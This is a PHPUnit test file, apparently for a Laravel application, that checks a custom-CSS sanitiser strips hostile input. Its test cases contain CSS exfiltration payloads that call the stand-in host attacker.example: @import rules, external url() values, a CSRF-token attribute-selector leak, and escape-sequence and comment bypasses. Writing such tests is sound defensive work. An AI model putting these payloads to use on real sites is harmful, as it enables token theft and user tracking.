<?php

namespace Tests\Unit\Models;

use App\Models\Setting;
use Tests\TestCase;

class SettingCustomCssTest extends TestCase
{
    private function withCustomCss(string $css): string
    {
        $settings = Setting::getSettings();
        $settings->custom_css = $css;
        $settings->save();

        return $settings->show_custom_css();
    }

    public function test_plain_css_passes_through_unchanged(): void
    {
        $out = $this->withCustomCss('.nav > li { color: #ff0000; }');

        $this->assertStringContainsString('.nav > li', $out);
        $this->assertStringContainsString('#ff0000', $out);
    }

    public function test_double_quoted_selector_survives(): void
    {
        $out = $this->withCustomCss('input[name="_token"] { display: none; }');

        $this->assertStringContainsString('name="_token"', $out);
    }

    public function test_import_at_rule_is_stripped(): void
    {
        $out = $this->withCustomCss('@import url("https://attacker.example/exfil.css");');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_import_at_rule_stripped_case_insensitive(): void
    {
        $out = $this->withCustomCss('@IMPORT "https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('IMPORT', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_external_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("https://attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(//attacker.example/track.png); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_data_uri_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url(data:image/png;base64,AAAA); }');

        $this->assertStringNotContainsString('data:', $out);
    }

    public function test_relative_url_is_preserved(): void
    {
        $out = $this->withCustomCss('.brand { background: url("/uploads/logo.png"); }');

        $this->assertStringContainsString('/uploads/logo.png', $out);
    }

    public function test_html_tags_are_stripped(): void
    {
        $out = $this->withCustomCss('body { color: red; }<script>alert(1)</script>');

        // Inner text ("alert(1)") survives strip_tags but is harmless inside
        // <style>, since the CSS parser skips unrecognized tokens. What
        // matters is that no HTML tag boundary reaches the layout.
        $this->assertStringNotContainsString('<script', $out);
        $this->assertStringNotContainsString('</script', $out);
        $this->assertStringNotContainsString('<', $out);
    }

    public function test_attribute_selector_csrf_exfil_payload_is_neutered(): void
    {
        $payload = 'input[name="_token"][value^="a"] { background: url("https://attacker.example/?t=a"); }';

        $out = $this->withCustomCss($payload);

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    public function test_empty_custom_css_returns_empty_string(): void
    {
        $out = $this->withCustomCss('');

        $this->assertSame('', $out);
    }

    // The regex previously required at least one whitespace character
    // between @import and the following token. CSS tokenizes @import
    // followed by a string, url(), or ident as a valid at-rule with
    // no whitespace required, so the bare-quote form below reached
    // the browser untouched under the old pattern.
    public function test_import_at_rule_without_whitespace_is_stripped(): void
    {
        $out = $this->withCustomCss('@import"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // CSS strips comments during tokenization, so @import/*x*/"url"
    // is equivalent to @import "url". The previous \s+ pattern didn't
    // treat comment tokens as whitespace, so the payload survived.
    public function test_import_at_rule_with_comment_between_is_stripped(): void
    {
        $out = $this->withCustomCss('@import/*comment*/"https://attacker.example/exfil.css";');

        $this->assertStringNotContainsString('@import', $out);
        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // url() values are subject to CSS escape decoding. `\2F` decodes
    // to `/`, so `\2F\2F attacker.example` becomes `//attacker.example`
    // at browser render time. The scheme regex previously ran against
    // the raw pre-decode literal and missed the bypass.
    public function test_backslash_hex_escaped_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("\2F\2F attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }

    // Second CSS escape shape: `\X` where X is any non-hex char
    // produces X literally. `\/\/attacker.example` decodes to
    // `//attacker.example`. Same class of bypass, different escape form.
    public function test_backslash_char_escaped_protocol_relative_url_is_stripped(): void
    {
        $out = $this->withCustomCss('body { background: url("\/\/attacker.example/track.png"); }');

        $this->assertStringNotContainsString('attacker.example', $out);
    }
}
